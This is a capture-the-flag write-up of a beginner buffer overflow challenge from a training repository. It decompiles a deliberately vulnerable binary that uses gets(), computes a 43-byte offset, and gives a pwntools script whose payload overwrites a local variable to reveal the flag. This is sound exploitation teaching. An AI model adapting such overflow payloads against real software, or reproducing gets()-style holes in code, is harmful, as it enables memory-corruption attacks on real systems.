This is a short write-up of Challenge #1 a variable overflow from [hoppersroppers nightmare repository](https://github.com/hoppersroppers/nightmare/tree/master/modules/04-Overflows).

First things first lets find out what we are working with.

```jsx
checksec pwn1
[*] '/home/user/nightmare/pwn1'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

pwn1 is a `32` bit little endian binary with RELRO, a Non-Executable Stack, and PIE. We also can verify that we can run this binary but it exits as it seems to not like our answer to the question asked.

```jsx
./pwn1
Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
bugsy
I don't know that! Auuuuuuuugh!
```

Within Ghidra we can locate an exported function `main`. `main` has 3 main parts question 1, 2, and 3. 

```c
/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */
/* WARNING: Globals starting with '_' overlap smaller symbols at the same address */

undefined4 main(undefined param_1)

{
  int iVar1;
  char userVar [43];
  int local_18;
  undefined4 local_14;
  undefined1 *local_10;
  
  local_10 = &param_1;
  setvbuf(_stdout,(char *)0x2,0,0);
  local_14 = 2;
  local_18 = 0;
  puts(
      "Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see."
      );
  puts("What... is your name?");
  fgets(userVar,0x2b,_stdin);
  iVar1 = strcmp(userVar,"Sir Lancelot of Camelot\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is your quest?");
  fgets(userVar,0x2b,_stdin);
  iVar1 = strcmp(userVar,"To seek the Holy Grail.\n");
  if (iVar1 != 0) {
    puts("I don\'t know that! Auuuuuuuugh!");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  puts("What... is my secret?");
  gets(userVar);
  if (local_18 == -0x215eef38) {
    print_flag();
  }
  else {
    puts("I don\'t know that! Auuuuuuuugh!");
  }
  return 0;
}
```

Question 1: "What... is your name?"

This uses `fgets()` to safely retrieve `userVar` verify that it is within the bounds of the allocated array. It is then compared it to a hard coded string, `"Sir Lancelot of Camelot\n"`. If it is is equal we continue to the next question.

Question 2: "What... is your quest?"

Once again using `fgets()` to retrieve `userVar`, `userVar` is then compared to another hard-coded string, `"To seek the Holy Grail.\n"`. If it is equal then we continue to the third question. 

Question 3: "What... is my secret?"

This time `gets()` is used to retrieve `userVar`. Meaning that the bounds of the array are not verified and there does not appear to be any other type of safety checks. Additionally `userVar` is not being compared this time. This time `local_18` is compared to `-0x215eef38` instead of a hard-coded string and if it is equal then `print_flag()` is called. However, `local_18` is set to equal 0 so in order for the two to be equal we will need to overwrite the value of `local_18`.

Thanks to Ghidra we can view the assembly instructions of the function. This shows us that `userVar` starts at `-0x43` and `local_18` starts at `-0x18`. 

1. Offset=0x43−0x18
2. Offset=0x2B

![pwn1.png](Overflow%20Challenge%20#1%200dcf7e07e2974561ae2c6c519db471de/pwn1.png)

Viewing the assembly for `if (local_18 == -0x215eef38)` we see that local_18 is being compared to `0xdea110c8`.

![pwn2.png](Overflow%20Challenge%20#1%200dcf7e07e2974561ae2c6c519db471de/pwn2.png)

Armed with this knowledge we know we need to overwrite `0x2B` (43 bytes) prior to overwriting local_18 with the value that we want it to be, in this case `0xdea110c8`.

Hacking a Python script together I ended up with the following:

```python
from pwn import *

p = process('./pwn1')

junk = b'A' * 0x2b
comparedVal = 0xdea110c8
newLine = b'\n'

payload = [
    junk,
    p32(comparedVal),
    newLine
]

print(p.recvline())
# Question 1
print(p.recvline())
p.sendline(b'Sir Lancelot of Camelot')

# Question 2
print(p.recvline())
p.sendline(b"To seek the Holy Grail.")

# Question 3
print(p.recvline())
print("Sending payload....")
p.send(b''.join(payload))

print(p.recvline())
print(p.recvline())
```

And we got the flag!

```python
python3 ./pwn1.py
[+] Starting local process '/home/user/nightmare/pwn1': pid 7811
b'Stop! Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.\n'
b'What... is your name?\n'
b'What... is your quest?\n'
b'What... is my secret?\n'
Sending payload....
[*] Process '/home/user/nightmare/pwn1' stopped with exit code 0 (pid 7811)
b'Right. Off you go.\n'
b'flag{g0ttem_b0yz}\n'
```